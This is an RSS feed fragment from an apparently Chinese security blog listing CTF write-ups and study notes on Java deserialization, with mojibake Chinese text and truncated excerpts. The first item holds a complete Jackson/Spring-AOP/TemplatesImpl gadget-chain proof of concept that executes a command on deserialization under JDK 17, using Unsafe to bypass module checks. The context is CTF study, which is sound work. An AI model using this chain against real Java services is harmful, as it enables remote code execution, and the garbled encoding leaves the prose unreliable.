1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 package org.example; import com.fasterxml.jackson.databind.node.POJONode; import javassist.ClassPool; import javassist.CtClass; import javassist.CtMethod; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import org.springframework.aop.framework.AdvisedSupport; import sun.misc.Unsafe; import javax.swing.event.EventListenerList; import javax.swing.undo.UndoManager; import javax.xml.transform.Templates; import java.io.*; import java.lang.reflect.Constructor; import java.lang.reflect.Field; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.Vector; public class SpringPoc { public static void main(String[] args) throws Exception { patchModule(SpringPoc.class); ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.makeClass(&amp;amp;#34;Evil&amp;amp;#34; + System.nanoTime()); evilClass.makeClassInitializer().insertAfter(&amp;amp;#34;java.lang.Runtime.getRuntime().exec(\&amp;amp;#34;open -a Calculator\&amp;amp;#34;);&amp;amp;#34;); byte[] evilBytes = evilClass.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); CtClass stubClass = pool.makeClass(&amp;amp;#34;Stub&amp;amp;#34; + System.nanoTime()); byte[] stubBytes = stubClass.toBytecode(); setFieldValue(templates, &amp;amp;#34;_bytecodes&amp;amp;#34;, new byte[][]{evilBytes, stubBytes}); setFieldValue(templates, &amp;amp;#34;_name&amp;amp;#34;, &amp;amp;#34;Pwnd&amp;amp;#34;); setFieldValue(templates, &amp;amp;#34;_transletIndex&amp;amp;#34;, 0); CtClass nodeClass = pool.get(&amp;amp;#34;com.fasterxml.jackson.databind.node.BaseJsonNode&amp;amp;#34;); CtMethod writeReplace = nodeClass.getDeclaredMethod(&amp;amp;#34;writeReplace&amp;amp;#34;); nodeClass.removeMethod(writeReplace); nodeClass.toClass(); Object proxyTemplates = getPOJONodeStableProxy(templates); POJONode jsonNode = new POJONode(proxyTemplates); EventListenerList listenerList = new EventListenerList(); UndoManager undoManager = new UndoManager(); Field editsField = getField(undoManager.getClass(), &amp;amp;#34;edits&amp;amp;#34;); editsField.setAccessible(true); Vector edits = (Vector) editsField.get(undoManager); edits.add(jsonNode); setFieldValue(listenerList, &amp;amp;#34;listenerList&amp;amp;#34;, new Object[]{Class.class, undoManager}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(listenerList); oos.close(); ByteArrayInputStream bais = new ByteArrayInputStream(barr.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); } private static void patchModule(Class&amp;amp;lt;?&amp;amp;gt; clazz) { try { Unsafe unsafe = getUnsafe(); Module javaBaseModule = Object.class.getModule(); long offset = unsafe.objectFieldOffset(Class.class.getDeclaredField(&amp;amp;#34;module&amp;amp;#34;)); unsafe.putObject(clazz, offset, javaBaseModule); } catch (Exception e) { e.printStackTrace(); } } private static Unsafe getUnsafe() throws Exception { Field f = Unsafe.class.getDeclaredField(&amp;amp;#34;theUnsafe&amp;amp;#34;); f.setAccessible(true); return (Unsafe) f.get(null); } private static Field getField(Class&amp;amp;lt;?&amp;amp;gt; clazz, String fieldName) { Field field = null; while (clazz != null) { try { field = clazz.getDeclaredField(fieldName); break; } catch (NoSuchFieldException e) { clazz = clazz.getSuperclass(); } } return field; } private static void setFieldValue(Object obj, String field, Object val) throws Exception { Field dField = obj.getClass().getDeclaredField(field); dField.setAccessible(true); dField.set(obj, val); } private static Object getPOJONodeStableProxy(Object templatesImpl) throws Exception { Class&amp;amp;lt;?&amp;amp;gt; clazz = Class.forName(&amp;amp;#34;org.springframework.aop.framework.JdkDynamicAopProxy&amp;amp;#34;); Constructor&amp;amp;lt;?&amp;amp;gt; cons = clazz.getDeclaredConstructor(AdvisedSupport.class); cons.setAccessible(true); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(templatesImpl); InvocationHandler handler = (InvocationHandler) cons.newInstance(advisedSupport); Object proxyObj = Proxy.newProxyInstance( clazz.getClassLoader(), new Class[]{Templates.class, Serializable.class}, handler ); return proxyObj; } }</description><content:encoded>ä½ç‰ˆæœ¬çš„æˆ‘ä¹Ÿä¸æ‡‚ï¼Œæˆ‘åªçŸ¥é“é«˜ç‰ˆæœ¬çš„ã€‚
é«˜ç‰ˆæœ¬ BadAttributeValueExpException ä¸èƒ½è§¦å‘ toString äº†ï¼Œå¯»æ‰¾ä¸€ä¸ªæ›¿æ¢çš„ç±»ï¼Œä¹‹å‰å­¦åˆ°è¿‡åœ¨EventListenerList#readObjectä¸­æœ‰ä¸€ä¸ª add æ–¹æ³•ï¼Œä¼šåŠ¨æ€åŠ è½½å¹¶ç›‘å¬ç±»ï¼Œå¯ä»¥è§¦å‘ toString â€¦</content:encoded></item><item><title>é«˜ç‰ˆæœ¬ Jdk åå°„ &amp; TemplatesImpl</title><link>https://baozongwi.xyz/p/high-jdk-reflection-templatesimpl/</link><guid>https://baozongwi.xyz/p/high-jdk-reflection-templatesimpl/</guid><pubDate>Wed, 10 Dec 2025 08:50:24 +0800</pubDate><description>ç°åœ¨å®é™…çš„ CTF å…¶å®åŸºæœ¬éƒ½æ˜¯é«˜ç‰ˆæœ¬ååºåˆ—åŒ–ï¼Œä½ç‰ˆæœ¬ç”Ÿæ´»ä¸­æœ‰ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå°‘äº†ï¼Œä¹‹å‰æœ‰ç”¨è¿‡è¿™ç±»çŸ¥è¯†å»è§£é¢˜ï¼Œä½†æ˜¯ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆï¼Œç°åœ¨æ¥å­¦ä¹ ä¸‹
æœ¬æ–‡ä¸­æ¶‰åŠçš„ TemplatesImpl çŸ¥è¯†å¹¶éé«˜ç‰ˆæœ¬ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬ä¸­éœ€è¦org.springframework.aop.framework.JdkDynamicAopProxyä»£ç†è§£å†³å…¶ç¨³å®šæ€§ï¼Œä½†æ˜¯è¿™ä¸ªç±»åœ¨spring-aopä¾èµ–ä¸­ã€‚
åå°„ jdk9 ä¹‹åçš„æ¨¡å—åŒ– Javaæ¨¡å—åŒ–ä¸»è¦æ˜¯ç”¨æ¥è§£å†³ä¾èµ–çš„é—®é¢˜ï¼Œä»¥åŠç»™åŸç”ŸJDKç˜¦èº«è¿™ä¸¤ä¸ªä½œç”¨ã€‚
åœ¨æ­¤ä¹‹å‰ï¼ŒJava é¡¹ç›®ç”±ä¸€å † JAR åŒ…ç»„æˆã€‚JVM å¹¶ä¸å…³å¿ƒ JAR åŒ…ä¹‹é—´çš„ä¾èµ–å…³ç³»ï¼Œåªè´Ÿè´£æŠŠå®ƒä»¬è§£å‹å‡ºçš„ class æ–‡ä»¶å †åœ¨ Classpath ä¸‹ã€‚ä¸€æ—¦æ¼ä¼ äº†æŸä¸ªä¾èµ– JARï¼Œç¨‹åºåªèƒ½åœ¨è¿è¡Œæ—¶æŠ›å‡º ClassNotFoundException å´©æºƒã€‚
JDK 9 å¼•å…¥æ¨¡å—åŒ–åï¼Œå¦‚æœæ¨¡å— A ä¾èµ–æ¨¡å— Bï¼Œå¿…é¡»åœ¨module-info.classä¸­æ˜¾å¼å£°æ˜ã€‚è¿™è®© JVM åœ¨å¯åŠ¨æ—¶å°±èƒ½å®šä½å¹¶éªŒè¯æ‰€æœ‰ä¾èµ–ã€‚
åœ¨ JDK 9 ä¹‹å‰ï¼Œåªè¦åˆ©ç”¨åå°„ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä»»ä½•ç±»ï¼ˆpublic/privateï¼‰ã€‚ä½†åœ¨æ¨¡å—åŒ–ä¹‹åï¼Œè®¿é—®æƒé™è¢«ä¸¥æ ¼é™åˆ¶åœ¨æ¨¡å—å†…éƒ¨ã€‚é™¤éç›®æ ‡æ¨¡å—åœ¨ module-info ä¸­æ˜¾å¼ exportsæˆ–opensäº†æŸä¸ªåŒ…ï¼Œå¦åˆ™å¤–éƒ¨æ— æ³•é€šè¿‡åå°„è®¿é—®å…¶ä¸­çš„ç±»ï¼Œç”šè‡³è¿setAccessible(true)éƒ½ä¼šå¤±æ•ˆã€‚ è¿™ç›´æ¥å¯¼è‡´äº†å¤§é‡ä¾èµ–ç§æœ‰å±æ€§ä¿®æ”¹çš„ Gadget é“¾åœ¨é«˜ç‰ˆæœ¬ JDK ä¸­æ–­è£‚ã€‚
jdk17 çš„å¼ºå°è£… Oracleå®˜æ–¹ä¸Šè¿°æ–‡æ¡£ä¸­æåˆ°äº†Strong Encapsulationï¼Œè¿™ä¸ªä¸»è¦å°±æ˜¯é’ˆå¯¹java*åŒ…ä¸‹çš„æ‰€æœ‰épublicå­—æ®µçš„å¦‚æœæˆ‘ä»¬åœ¨JDK17çš„æ—¶å€™å¯¹java*ä¸‹çš„éå…¬å…±å­—æ®µè¿›è¡Œåå°„è°ƒç”¨çš„è¯å°±ä¼šç›´æ¥æŠ¥é”™ã€‚
å…¶å®è¿™ä¸ªä¸œè¥¿åœ¨JDK9ä¹‹åå°±å¼€å§‹è¢«æ ‡è®°ä¸ºäº†ä¸å®‰å…¨é€‰é¡¹,ä½†æ˜¯ç”±äºå¾ˆå¤šå¤§å‹é¡¹ç›®ä¹‹å‰è¿˜æ˜¯ç›´æ¥ä½¿ç”¨åå°„è¿™ä¸ªåŠŸèƒ½ï¼Œç›´åˆ°JDK17æ‰å°†å…¶å¼ºåˆ¶åŒ–ã€‚
æµ‹è¯•ç±»
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 package org.example; import javassist.ClassPool; import javassist.CtClass; import java.lang.reflect.Method; public class test { public static void main(String[] args) throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass evilClass = pool.get(&amp;amp;#34;Evil&amp;amp;#34;); evilClass.setName(&amp;amp;#34;Evil&amp;amp;#34; + System.nanoTime()); byte[] bytecodes = evilClass.toBytecode(); Method defineClass= ClassLoader.class.getDeclaredMethod(&amp;amp;#34;defineClass&amp;amp;#34;, String.class, byte[].class, int.class, int.class); defineClass.setAccessible(true); defineClass.invoke(ClassLoader.getSystemClassLoader(), &amp;amp;#34;attack&amp;amp;#34;, bytecodes, 0, bytecodes.length); } } æ¶æ„ç±»</description><content:encoded>ç°åœ¨å®é™…çš„ CTF å…¶å®åŸºæœ¬éƒ½æ˜¯é«˜ç‰ˆæœ¬ååºåˆ—åŒ–ï¼Œä½ç‰ˆæœ¬ç”Ÿæ´»ä¸­æœ‰ï¼Œä½†æ˜¯ä¹Ÿå¾ˆå°‘äº†ï¼Œä¹‹å‰æœ‰ç”¨è¿‡è¿™ç±»çŸ¥è¯†å»è§£é¢˜ï¼Œä½†æ˜¯ä¸å¤ªç†è§£ä¸ºä»€ä¹ˆï¼Œç°åœ¨æ¥å­¦ä¹ ä¸‹
æœ¬æ–‡ä¸­æ¶‰åŠçš„ TemplatesImpl çŸ¥è¯†å¹¶éé«˜ç‰ˆæœ¬ï¼Œå› ä¸ºé«˜ç‰ˆæœ¬ä¸­éœ€ â€¦</content:encoded></item><item><title>å·…å³°æå®¢2024 Ezjava</title><link>https://baozongwi.xyz/p/peak-geek-2024-ezjava/</link><guid>https://baozongwi.xyz/p/peak-geek-2024-ezjava/</guid><pubDate>Sun, 30 Nov 2025 13:39:02 +0800</pubDate><description>é»‘ç›’æ‰“ Commons-Beanutils 1.9+ è‡ªå¸¦ Commons-Collections3.2.1ï¼Œé«˜ç‰ˆæœ¬ jdk17ï¼Œç”¨sun.misc.Unsafeæ¥åå°„ã€‚
pom.xml
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 &amp;amp;lt;?xml version=&amp;amp;#34;1.0&amp;amp;#34; encoding=&amp;amp;#34;UTF-8&amp;amp;#34;?&amp;amp;gt; &amp;amp;lt;project xmlns=&amp;amp;#34;http://maven.apache.org/POM/4.0.0&amp;amp;#34; xmlns:xsi=&amp;amp;#34;http://www.w3.org/2001/XMLSchema-instance&amp;amp;#34; xsi:schemaLocation=&amp;amp;#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&amp;amp;#34;&amp;amp;gt; &amp;amp;lt;modelVersion&amp;amp;gt;4.0.0&amp;amp;lt;/modelVersion&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.example&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;ezjava&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;1.0-SNAPSHOT&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;properties&amp;amp;gt; &amp;amp;lt;maven.compiler.source&amp;amp;gt;17&amp;amp;lt;/maven.compiler.source&amp;amp;gt; &amp;amp;lt;maven.compiler.target&amp;amp;gt;17&amp;amp;lt;/maven.compiler.target&amp;amp;gt; &amp;amp;lt;project.build.sourceEncoding&amp;amp;gt;UTF-8&amp;amp;lt;/project.build.sourceEncoding&amp;amp;gt; &amp;amp;lt;/properties&amp;amp;gt; &amp;amp;lt;dependencies&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;commons-beanutils&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;commons-beanutils&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;1.9.2&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.javassist&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;javassist&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;3.29.2-GA&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.springframework&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;spring-web&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;5.3.20&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;scope&amp;amp;gt;provided&amp;amp;lt;/scope&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;dependency&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;javax.servlet&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;javax.servlet-api&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;4.0.1&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;scope&amp;amp;gt;provided&amp;amp;lt;/scope&amp;amp;gt; &amp;amp;lt;/dependency&amp;amp;gt; &amp;amp;lt;/dependencies&amp;amp;gt; &amp;amp;lt;build&amp;amp;gt; &amp;amp;lt;plugins&amp;amp;gt; &amp;amp;lt;plugin&amp;amp;gt; &amp;amp;lt;groupId&amp;amp;gt;org.apache.maven.plugins&amp;amp;lt;/groupId&amp;amp;gt; &amp;amp;lt;artifactId&amp;amp;gt;maven-compiler-plugin&amp;amp;lt;/artifactId&amp;amp;gt; &amp;amp;lt;version&amp;amp;gt;3.8.1&amp;amp;lt;/version&amp;amp;gt; &amp;amp;lt;configuration&amp;amp;gt; &amp;amp;lt;source&amp;amp;gt;17&amp;amp;lt;/source&amp;amp;gt; &amp;amp;lt;target&amp;amp;gt;17&amp;amp;lt;/target&amp;amp;gt; &amp;amp;lt;encoding&amp;amp;gt;UTF-8&amp;amp;lt;/encoding&amp;amp;gt; &amp;amp;lt;compilerArgs&amp;amp;gt; &amp;amp;lt;arg&amp;amp;gt;--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED&amp;amp;lt;/arg&amp;amp;gt; &amp;amp;lt;arg&amp;amp;gt;--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED&amp;amp;lt;/arg&amp;amp;gt; &amp;amp;lt;arg&amp;amp;gt;--add-exports=java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED&amp;amp;lt;/arg&amp;amp;gt; &amp;amp;lt;arg&amp;amp;gt;--add-exports=java.xml/com.sun.org.apache.xml.internal.serializer=ALL-UNNAMED&amp;amp;lt;/arg&amp;amp;gt; &amp;amp;lt;arg&amp;amp;gt;--add-exports=java.xml/com.sun.org.apache.xml.internal.dtm=ALL-UNNAMED&amp;amp;lt;/arg&amp;amp;gt; &amp;amp;lt;/compilerArgs&amp;amp;gt; &amp;amp;lt;/configuration&amp;amp;gt; &amp;amp;lt;/plugin&amp;amp;gt; &amp;amp;lt;/plugins&amp;amp;gt; &amp;amp;lt;/build&amp;amp;gt; &amp;amp;lt;/project&amp;amp;gt;</description><content:encoded>é»‘ç›’æ‰“ Commons-Beanutils 1.9+ è‡ªå¸¦ Commons-Collections3.2.1ï¼Œé«˜ç‰ˆæœ¬ jdk17ï¼Œç”¨sun.misc.Unsafeæ¥åå°„ã€‚
pom.xml
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 â€¦</content:encoded></item><item><title>å·…å³°æå®¢2023 BabyURL</title><link>https://baozongwi.xyz/p/peak-geek-2023-babyurl/</link><guid>https://baozongwi.xyz/p/peak-geek-2023-babyurl/</guid><pubDate>Sat, 29 Nov 2025 17:15:06 +0800</pubDate><description>èµ·ä¸ª docker
1 docker run -it -d -p 12345:8080 -e &amp;amp;#34;FLAG=flag{test_flag}&amp;amp;#34; lxxxin/dfjk2023_babyurl åç¼–è¯‘ jar åŒ…ï¼ŒJacksonä¾èµ–ï¼Œ
ç›´æ¥ç»™äº†ååºåˆ—åŒ–æ¥å£ï¼Œä¸è¿‡çœ‹äº†ä¸‹è·¯ç”±ï¼Œæ˜¯æ— å›æ˜¾çš„ï¼Œä½†æ˜¯ä¹Ÿè´´å¿ƒçš„ç»™äº†å›æ˜¾è·¯ç”±/fileï¼Œä»–ä½¿ç”¨çš„ç±»æ˜¯ URLHelper
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 package com.yancao.ctf.bean; import java.io.File; import java.io.FileOutputStream; import java.io.ObjectInputStream; import java.io.Serializable; /* loaded from: ctf-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/yancao/ctf/bean/URLHelper.class */ public class URLHelper implements Serializable { public String url; public URLVisiter visiter = null; private static final long serialVersionUID = 1; public URLHelper(String url) { this.url = url; } private void readObject(ObjectInputStream in) throws Exception { in.defaultReadObject(); if (this.visiter != null) { String result = this.visiter.visitUrl(this.url); File file = new File(&amp;amp;#34;/tmp/file&amp;amp;#34;); if (!file.exists()) { file.createNewFile(); } FileOutputStream fos = new FileOutputStream(file); fos.write(result.getBytes()); fos.close(); } } } æ‰€ä»¥åªéœ€è¦æŠŠå›æ˜¾å†™åˆ°/tmp/fileå³å¯ã€‚</description><content:encoded>èµ·ä¸ª docker
1 docker run -it -d -p 12345:8080 -e &amp;amp;amp;#34;FLAG=flag{test_flag}&amp;amp;amp;#34; lxxxin/dfjk2023_babyurl åç¼–è¯‘ jar åŒ…ï¼ŒJacksonä¾èµ–ï¼Œ
ç›´æ¥ç»™äº†ååºåˆ—åŒ–æ¥å£ï¼Œä¸è¿‡çœ‹äº†ä¸‹è·¯ç”±ï¼Œæ˜¯æ— å›æ˜¾çš„ï¼Œä½†æ˜¯ â€¦</content:encoded></item><item><title>Jacksonååºåˆ—åŒ–æ¼æ´</title><link>https://baozongwi.xyz/p/jackson-deserialization/</link><guid>https://baozongwi.xyz/p/jackson-deserialization/</guid><pubDate>Thu, 27 Nov 2025 21:34:40 +0800</pubDate><description>å¤ªå¤æ‚äº†ğŸ˜Ÿ</description><content:encoded>ååºåˆ—åŒ–ä¸­ç±»å±æ€§æ–¹æ³•çš„è°ƒç”¨ é’ˆå¯¹ JacksonPolymorphicDeserialization ä¹Ÿå°±æ˜¯ Jackson ä¸­å¤šæ€çš„ååºåˆ—åŒ–åœºæ™¯è¿›è¡Œåˆ†æ
é€šè¿‡å‰é¢çš„å­¦ä¹ ï¼Œæˆ‘ä»¬çŸ¥é“å…¶ååºåˆ—åŒ–å¿…ç„¶æ˜¯ä¼šè§¦å‘ setter æ–¹æ³•çš„ï¼Œè¿™é‡Œ debug ä¸€ä¸‹å­¦ä¹ ä¸‹æµç¨‹
ä¸è¿‡æˆ‘ä»¬æ˜¯çŸ¥é“çš„ï¼Œ â€¦</content:encoded></item><item><title>JacksonåŸºç¡€å­¦ä¹ </title><link>https://baozongwi.xyz/p/jackson-basics/</link><guid>https://baozongwi.xyz/p/jackson-basics/</guid><pubDate>Thu, 27 Nov 2025 21:25:22 +0800</pubDate><description>Jackson æ˜¯å½“å‰ Java ç”Ÿæ€ä¸­æœ€æµè¡Œçš„å¼€æº JSON æ¡†æ¶ä¹‹ä¸€ï¼Œå› å…¶é«˜æ€§èƒ½ã€ä½å†…å­˜å ç”¨åŠçµæ´»çš„æ‰©å±•æ€§è€Œè¢«é€‰ä¸º Spring MVC çš„é»˜è®¤è§£æå™¨ï¼Œåœ¨å¤„ç†å¤§æ–‡ä»¶æ—¶é€Ÿåº¦æ˜¾è‘—ä¼˜äº Gsonã€‚å…¶æ ¸å¿ƒæ¶æ„ç”±ä¸‰ä¸ªæ¨¡å—ç»„æˆï¼šåº•å±‚çš„ jackson-core æä¾›é«˜æ•ˆçš„æµæ¨¡å¼è§£æ APIï¼Œjackson-annotations æä¾›æ ‡å‡†æ³¨è§£æ”¯æŒï¼Œè€Œæœ€å¸¸ç”¨çš„ jackson-databind åˆ™åŸºäºå‰ä¸¤è€…å®ç°äº†å¯¹è±¡ç»‘å®šï¼ˆObjectMapperï¼‰å’Œæ ‘æ¨¡å‹è§£æï¼Œå…±åŒæ„æˆäº†ç®€å•æ˜“ç”¨ä¸”åŠŸèƒ½å¼ºå¤§çš„ JSON å¤„ç†æ–¹æ¡ˆã€‚
å¸¸ç”¨ç±» ObjectMapper Jackson æœ€å¸¸ç”¨çš„ API å°±æ˜¯åŸºäº&amp;amp;quot;å¯¹è±¡ç»‘å®š&amp;amp;quot; çš„ ObjectMapperï¼š
ObjectMapper å¯ä»¥ä»å­—ç¬¦ä¸²ã€æµæˆ–æ–‡ä»¶ä¸­è§£æ JSONï¼Œå¹¶åˆ›å»ºè¡¨ç¤ºå·²è§£æçš„ JSON çš„ Java å¯¹è±¡ã€‚ å°†JSON è§£æä¸º Java å¯¹è±¡ä¹Ÿç§°ä¸ºä» JSON ååºåˆ—åŒ–ä¸º Java å¯¹è±¡ã€‚ObjectMapper ä¹Ÿå¯ä»¥ä» Java å¯¹è±¡åˆ›å»ºJSONï¼Œä» Java å¯¹è±¡ç”Ÿæˆ JSON ä¹Ÿç§°ä¸ºå°† Java å¯¹è±¡åºåˆ—åŒ–ä¸º JSONï¼ŒObject æ˜ å°„å™¨å¯ä»¥å°† JSON è§£æä¸ºè‡ªå®šä¹‰çš„ç±»çš„å¯¹è±¡ï¼Œä¹Ÿå¯ä»¥è§£æç½® JSON æ ‘æ¨¡å‹çš„å¯¹è±¡ï¼Œ
ä¹‹æ‰€ä»¥ç§°ä¸º ObjectMapper æ˜¯å› ä¸ºå®ƒå°† JSON æ˜ å°„åˆ° Java å¯¹è±¡ï¼ˆååºåˆ—åŒ–ï¼‰ï¼Œæˆ–è€…å°†Javaå¯¹è±¡æ˜ å°„åˆ°JSONï¼ˆåºåˆ—åŒ–ï¼‰ï¼Œçªå‡ºæ˜ å°„äºŒå­—ã€‚
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package org.base; public class User { public String name; public int age; public User(){ } public User(String name, int age) { this.name = name; this.age = age; } public String getName() { System.out.println(&amp;amp;#34;getName called&amp;amp;#34;); return name; } public void setName(String name) { System.out.println(&amp;amp;#34;setName called&amp;amp;#34;); this.name = name; } public int getAge() { System.out.println(&amp;amp;#34;getAge called&amp;amp;#34;); return age; } public void setAge(int age) { System.out.println(&amp;amp;#34;setAge called&amp;amp;#34;); this.age = age; } } åºåˆ—åŒ–</description><content:encoded>Jackson æ˜¯å½“å‰ Java ç”Ÿæ€ä¸­æœ€æµè¡Œçš„å¼€æº JSON æ¡†æ¶ä¹‹ä¸€ï¼Œå› å…¶é«˜æ€§èƒ½ã€ä½å†…å­˜å ç”¨åŠçµæ´»çš„æ‰©å±•æ€§è€Œè¢«é€‰ä¸º Spring MVC çš„é»˜è®¤è§£æå™¨ï¼Œåœ¨å¤„ç†å¤§æ–‡ä»¶æ—¶é€Ÿåº¦æ˜¾è‘—ä¼˜äº Gsonã€‚å…¶æ ¸å¿ƒæ¶æ„ç”±ä¸‰ä¸ªæ¨¡å—ç»„æˆï¼šåº•å±‚çš„ jackson-core â€¦</content:encoded></item><item><title>D3CTF2023 Ezjava</title><link>https://baozongwi.xyz/p/d3ctf-2023-ezjava/</link><guid>https://baozongwi.xyz/p/d3ctf-2023-ezjava/</guid><pubDate>Thu, 20 Nov 2025 21:27:35 +0800</pubDate><description>ä»åå“¥çš„åšå®¢é‡Œé¢æ‹¿åˆ°é™„ä»¶ï¼Œæ‰“å¼€ä¸€çœ‹æ˜¯æœ‰dockerçš„ï¼Œè¿™å¯æ˜¯ä¸€ä»¶ç¾äº‹å•Šï¼Œæ‹‰dockerçš„æ—¶å€™é¡¶é’ˆåˆ°æœ‰ä¸ª8u342ï¼Œæœ€è¿‘å¯¹è¿™ä¸ªæ¯”è¾ƒæ•æ„Ÿï¼Œå¯ä»¥ç›´æ¥BCELåŠ è½½å­—èŠ‚ç 
æœ‰ä¸¤ä¸ª jar åŒ…ä¸¤ä¸ªæœåŠ¡
flag åœ¨ server é‡Œé¢ï¼Œå¹¶ä¸” server æ˜¯ä¸æš´éœ²çš„
1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 package com.example.server.controller; import ch.qos.logback.core.spi.AbstractComponentTracker; import com.alibaba.fastjson2.JSON; import com.example.server.data.Result; import com.example.server.util.DefaultSerializer; import com.example.server.util.Request; import java.net.InetAddress; import java.util.ArrayList; import java.util.Base64; import java.util.List; import org.springframework.web.bind.annotation.GetMapping; import org.springframework.web.bind.annotation.RestController; @RestController /* loaded from: server-0.0.1-SNAPSHOT.jar:BOOT-INF/classes/com/example/server/controller/IndexController.class */ public class IndexController { public static List&amp;amp;lt;String&amp;amp;gt; denyClasses = new ArrayList(); public static long lastTimestamp = 0; @GetMapping({&amp;amp;#34;/status&amp;amp;#34;}) public Result status() { String msg; try { long currentTimestamp = System.currentTimeMillis(); msg = String.format(&amp;amp;#34;client %s is online&amp;amp;#34;, InetAddress.getLocalHost().getHostName()); if (currentTimestamp - lastTimestamp &amp;amp;gt; AbstractComponentTracker.LINGERING_TIMEOUT) { update(); lastTimestamp = System.currentTimeMillis(); } } catch (Exception e) { msg = &amp;amp;#34;client is online&amp;amp;#34;; } return Result.of(&amp;amp;#34;200&amp;amp;#34;, msg); } public void update() { try { String json = Request.get(&amp;amp;#34;http://registry:8080/blacklist/jdk/get&amp;amp;#34;); Result result = (Result) JSON.parseObject(json, Result.class); Object msg = result.getMessage(); if (msg instanceof String) { byte[] data = Base64.getDecoder().decode((String) msg); denyClasses = (List) DefaultSerializer.deserialize(data, denyClasses); } else if (msg instanceof List) { denyClasses = (List) msg; } } catch (Exception e) { e.printStackTrace(); } } } åªæœ‰ä¸€ä¸ª /status è·¯ç”±ï¼Œä½ æ¯ 10 ç§’è®¿é—®ä¸€æ¬¡è¯¥æ¥å£ï¼Œå°±èƒ½å¼ºåˆ¶è§¦å‘ä¸€æ¬¡åç«¯çš„update()æ“ä½œï¼Œåœ¨ update ä¸­ï¼Œä¼šè®¿é—® http://registry:8080/blacklist/jdk/get æš‚æ—¶è¿˜ä¸çŸ¥é“è¿™ä¸ªæ˜¯å¹²å˜›çš„ï¼Œç„¶åç”¨ JSON.parseObject å»è§£æä¸€ä¸‹ï¼Œæœ€åä¼šè¿›è¡Œä¸€ä¸ªååºåˆ—åŒ–ã€‚</description><content:encoded>ä»åå“¥çš„åšå®¢é‡Œé¢æ‹¿åˆ°é™„ä»¶ï¼Œæ‰“å¼€ä¸€çœ‹æ˜¯æœ‰dockerçš„ï¼Œè¿™å¯æ˜¯ä¸€ä»¶ç¾äº‹å•Šï¼Œæ‹‰dockerçš„æ—¶å€™é¡¶é’ˆåˆ°æœ‰ä¸ª8u342ï¼Œæœ€è¿‘å¯¹è¿™ä¸ªæ¯”è¾ƒæ•æ„Ÿï¼Œå¯ä»¥ç›´æ¥BCELåŠ è½½å­—èŠ‚ç 
æœ‰ä¸¤ä¸ª jar åŒ…ä¸¤ä¸ªæœåŠ¡
flag åœ¨ server é‡Œé¢ï¼Œå¹¶ä¸” server æ˜¯ä¸æš´éœ²çš„
